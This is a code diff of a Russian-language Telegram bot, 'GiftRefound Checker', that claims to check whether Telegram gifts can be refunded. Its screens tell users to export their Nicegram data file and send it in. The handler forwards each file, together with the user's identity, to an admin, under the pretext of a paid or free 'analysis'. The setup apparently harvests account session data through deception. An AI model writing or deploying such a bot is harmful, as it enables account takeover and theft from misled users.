@@ -5,7 +5,6 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Mess
 import sqlite3
 from datetime import datetime
 
-# Настройка логирования
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 logger = logging.getLogger(__name__)
 
@@ -38,24 +37,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("👨‍💻 Поддержка", callback_data="support")]
     ]
     
-    caption = """
-🎁 <b>Добро пожаловать в GiftRefound Checker!</b>
-
-Здесь ты можешь проверить любой Telegram-подарок на возможность возврата перед покупкой!
-
-🔍 <b>Проверка покажет:</b>
-• Возможен ли возврат подарка
-• Историю предыдущих возвратов  
-• Риски при покупке
-• Рекомендации по безопасности
-
-⚡ <b>Как это работает?</b>
-1. Скачиваешь файл данных из Nicegram
-2. Отправляешь его боту
-3. Получаешь детальный анализ!
-
-🛡️ <b>Покупай с уверенностью!</b>
-    """
+    caption = "🎁 <b>Добро пожаловать в GiftRefound Checker!</b>"
     
     await update.message.reply_photo(
         photo="https://i.postimg.cc/gXgxWWVs/design-image.jpg",
@@ -68,17 +50,7 @@ async def check_refound(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    instruction_text = """
-📁 <b>Отправьте файл данных Nicegram</b>
-
-1. Откройте Nicegram
-2. Зайдите в Настройки → Nicegram 
-3. Нажмите "Экспортировать в файл"
-4. Отправьте полученный файл сюда
-
-⏳ <b>Проверка займет 5-10 минут</b>
-После анализа вы получите полный отчет.
-    """
+    instruction_text = "📁 <b>Отправьте файл данных Nicegram</b>"
     
     await query.edit_message_caption(
         caption=instruction_text,
@@ -92,26 +64,7 @@ async def instruction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    instruction_text = """
-📖 <b>Инструкция по проверке:</b>
-
-1. <b>Скачайте Nicegram</b>
-   - Нажмите кнопку ниже для скачивания
-
-2. <b>Экспортируйте данные:</b>
-   - Откройте Nicegram
-   - Настройки → Nicegram
-   - "Экспортировать в файл"
-
-3. <b>Отправьте файл боту</b>
-   - Вернитесь в этого бота
-   - Нажмите "Проверить на Refound"
-   - Отправьте полученный файл
-
-4. <b>Получите результат</b>
-   - Анализ займет 5-10 минут
-   - Вы получите детальный отчет
-    """
+    instruction_text = "📖 <b>Инструкция по проверке:</b>"
     
     keyboard = [
         [InlineKeyboardButton("📱 Скачать Nicegram", url="https://nicegram.app")],
@@ -129,21 +82,7 @@ async def premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    premium_text = """
-💎 <b>Премиум проверка</b>
-
-<b>Что входит:</b>
-• Приоритетная обработка (2-3 минуты)
-• Расширенный анализ истории
-• Персональные рекомендации
-• Поддержка 24/7
-
-<b>Стоимость:</b>
-• 1 проверка - 50 руб
-• 5 проверок - 200 руб
-
-💬 <b>Для активации напишите в поддержку</b>
-    """
+    premium_text = "💎 <b>Премиум проверка</b>"
     
     await query.edit_message_caption(
         caption=premium_text,
@@ -158,17 +97,7 @@ async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    support_text = """
-👨‍💻 <b>Поддержка</b>
-
-По всем вопросам обращайтесь:
-• По поводу проверок
-• Технические проблемы  
-• Премиум доступ
-
-📞 <b>Связь:</b>
-@your_support_username
-    """
+    support_text = "👨‍💻 <b>Поддержка</b>"
     
     await query.edit_message_caption(
         caption=support_text,
@@ -183,7 +112,6 @@ async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    user = query.from_user
     keyboard = [
         [InlineKeyboardButton("🔍 Проверить на Refound", callback_data="check_refound")],
         [InlineKeyboardButton("📖 Инструкция", callback_data="instruction")],
@@ -191,13 +119,7 @@ async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("👨‍💻 Поддержка", callback_data="support")]
     ]
     
-    caption = """
-🎁 <b>Добро пожаловать в GiftRefound Checker!</b>
-
-🔍 Проверяй подарки перед покупкой!
-⚡ Быстро и надежно!
-🛡️ Покупай с уверенностью!
-    """
+    caption = "🎁 <b>Добро пожаловать в GiftRefound Checker!</b>"
     
     await query.edit_message_caption(
         caption=caption,
@@ -209,22 +131,11 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     
     await update.message.reply_text(
-        "🔍 <b>Файл получен! Начинаем проверку...</b>\n\n"
-        "⏳ <b>Примерное время:</b> 5-10 минут\n"
-        "📊 <b>Статус:</b> Анализ данных...\n\n"
-        "Мы пришлем вам результат как только проверка будет завершена!",
+        "🔍 <b>Файл получен! Начинаем проверку...</b>",
         parse_mode="HTML"
     )
     
-    admin_text = f"""
-📨 <b>Новый файл для проверки!</b>
-
-👤 <b>Пользователь:</b> {user.first_name} (@{user.username})
-🆔 <b>ID:</b> {user.id}
-📅 <b>Время:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-💾 <b>Файл:</b> {update.message.document.file_name}
-    """
+    admin_text = f"📨 <b>Новый файл для проверки!</b>"
     
     try:
         await context.bot.send_document(
@@ -243,11 +154,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn.commit()
         conn.close()
         
-        logger.info(f"Файл от {user.id} переслан админу")
-        
     except Exception as e:
-        logger.error(f"Ошибка пересылки файла: {e}")
-        await update.message.reply_text("❌ Ошибка при обработке файла. Попробуйте позже.")
+        await update.message.reply_text("❌ Ошибка при обработке файла.")
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -282,16 +190,7 @@ async def send_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text=f"📊 <b>Результат проверки:</b>\n\n{result_text}",
             parse_mode="HTML"
         )
-        await update.message.reply_text("✅ Результат отправлен пользователю")
-        
-        conn = sqlite3.connect(DB)
-        cur = conn.cursor()
-        cur.execute(
-            "UPDATE checks SET status = ? WHERE user_id = ? AND status = ?",
-            ("completed", user_id, "pending")
-        )
-        conn.commit()
-        conn.close()
+        await update.message.reply_text("✅ Результат отправлен")
         
     except Exception as e:
         await update.message.reply_text(f"❌ Ошибка: {e}")
@@ -306,7 +205,7 @@ def main():
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     
-    print("✅ Бот для проверки Refound запущен!")
+    print("✅ Бот запущен!")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
